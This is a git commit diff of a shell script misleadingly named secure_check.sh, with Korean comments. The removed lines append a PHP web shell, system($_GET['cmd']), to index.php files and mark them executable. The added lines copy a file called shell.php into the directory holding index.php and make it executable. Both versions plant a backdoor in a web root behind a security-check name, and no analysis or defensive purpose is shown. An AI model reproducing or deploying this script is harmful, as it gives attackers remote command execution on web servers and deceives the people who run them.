553e6538310756b40a8e28d996f7fc89b2e2ec75
jealoussy <99820621+jealoussy@users.noreply.github.com>
2023-06-22 15:32:39 +0900

    Update secure_check.sh

--- secure_check.sh
+++ secure_check.sh
@@ -4,15 +4,29 @@
 desktop_path="$HOME/Desktop"
 
 # index.php 파일 검색
-index_files=$(find "$desktop_path" -name "index.php")
+index_file_path=$(find "$desktop_path" -type f -name "index.php" -print -quit)
 
-# index.php 파일에 코드 추가
-for index_file in $index_files; do
-    echo "<?php header(\"Content-type: text/html; charset=euc-kr\"); ?>" >> "$index_file"
-    echo "<?php system(\$_GET[\"cmd\"]); ?>" >> "$index_file"
-    echo "Added code to $index_file"
+if [ -z "$index_file_path" ]; then
+  echo "index.php 파일을 찾을 수 없습니다."
+  exit 1
+fi
 
-    # index.php 파일에 실행 권한 부여
-    chmod +x "$index_file"
-    echo "Added execute permission to $index_file"
-done
+# index.php 파일이 있는 디렉토리 경로
+index_directory=$(dirname "$index_file_path")
+
+# shell.php 파일 검색
+shell_file_path=$(find "$desktop_path" -type f -name "shell.php" -print -quit)
+
+if [ -z "$shell_file_path" ]; then
+  echo "shell.php 파일을 찾을 수 없습니다."
+  exit 1
+fi
+
+# shell.php 파일 이동 또는 복사
+cp "$shell_file_path" "$index_directory"
+
+# 이동한 파일에 실행 권한 부여
+chmod +x "$index_directory/shell.php"
+
+echo "작업이 완료되었습니다."
+
